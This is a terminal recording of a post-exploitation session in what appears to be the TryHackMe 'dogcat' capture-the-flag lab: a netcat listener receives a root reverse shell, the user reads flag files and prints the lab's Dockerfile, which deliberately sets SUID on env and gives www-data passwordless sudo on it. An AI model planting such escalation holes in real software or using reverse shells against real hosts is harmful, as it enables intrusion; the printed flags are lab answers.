@@ -1,0 +1,80 @@
+Script started on 2025-04-06 22:35:18+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 5759
+bash: cannot set terminal process group (7649): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+root@dogcat:~# [Kroot@dogcat:~# [K[?2004hroot@dogcat:~# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+container
+flag4.txt
+root@dogcat:~# [Kroot@dogcat:~# [K[?2004hroot@dogcat:~# cat flga[K[Kaf[Kg4.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat flag4.txt
+[Kcat flag4.txt[Kcat flag4.txt[Kcat flag4.txt
+THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
+root@dogcat:~# [Kroot@dogcat:~# [K[?2004hroot@dogcat:~# ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 40
+drwx------  6 root root 4096 Apr  8  2020 .
+drwxr-xr-x 24 root root 4096 Apr  8  2020 ..
+lrwxrwxrwx  1 root root    9 Mar 10  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Apr  8  2020 .cache
+drwxr-xr-x  5 root root 4096 Mar 10  2020 container
+-rw-r--r--  1 root root   80 Mar 10  2020 flag4.txt
+drwx------  3 root root 4096 Apr  8  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Apr  8  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   66 Mar 10  2020 .selected_editor
+root@dogcat:~# [Kroot@dogcat:~# [K[?2004hroot@dogcat:~# cd /home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home
+[Kcd /home[Kcd /home[Kcd /home
+root@dogcat:/home# [Kroot@dogcat:/home# [K[?2004hroot@dogcat:/home# ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 8
+drwxr-xr-x  2 root root 4096 Mar  6  2020 .
+drwxr-xr-x 24 root root 4096 Apr  8  2020 ..
+root@dogcat:/home# [Kroot@dogcat:/home# [K[?2004hroot@dogcat:/home# cd - [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd - 
+[Kcd - [Kcd - [Kcd - 
+/root
+root@dogcat:~# [Kroot@dogcat:~# [K[?2004hroot@dogcat:~# cd con   [Ktainer[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd container
+[Kcd container[Kcd container[Kcd container
+root@dogcat:~/container# [Kroot@dogcat:~/container# [K[?2004hroot@dogcat:~/container# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+backup
+Dockerfile
+launch.sh
+src
+root@dogcat:~/container# [Kroot@dogcat:~/container# [K[?2004hroot@dogcat:~/container# ca[K[Kcat Doce[Kkerfile[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat Dockerfile
+[Kcat Dockerfile[Kcat Dockerfile[Kcat Dockerfile
+FROM php:apache-buster
+
+# Setup document root
+RUN mkdir -p /var/www/html
+
+# Make the document root a volume
+VOLUME /var/www/html
+
+# Add application
+WORKDIR /var/www/html
+COPY --chown=www-data src/ /var/www/html/
+
+RUN rm /var/log/apache2/*.log
+
+# Set up escalation     
+RUN chmod +s `which env`
+RUN apt-get update && apt-get install sudo -y
+RUN echo "www-data ALL = NOPASSWD: `which env`" >> /etc/sudoers
+
+# Write flag
+RUN echo "THM{D1ff3r3nt_3nv1ronments_874112}" > /root/flag3.txt
+RUN chmod 400 /root/flag3.txt
+
+RUN echo "THM{LF1_t0_RC3_aec3fb}" > /var/www/flag2_QMW7JvaY2LvK.txt
+
+EXPOSE 80
+
+# Configure a healthcheck to validate that everything is up&running
+HEALTHCHECK --timeout=10s CMD curl --silent --fail http://127.0.0.1:80/
+root@dogcat:~/container# [Kroot@dogcat:~/container# [K[?2004hroot@dogcat:~/container# exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2025-04-06 22:37:37+03:00 [COMMAND_EXIT_CODE="0"]
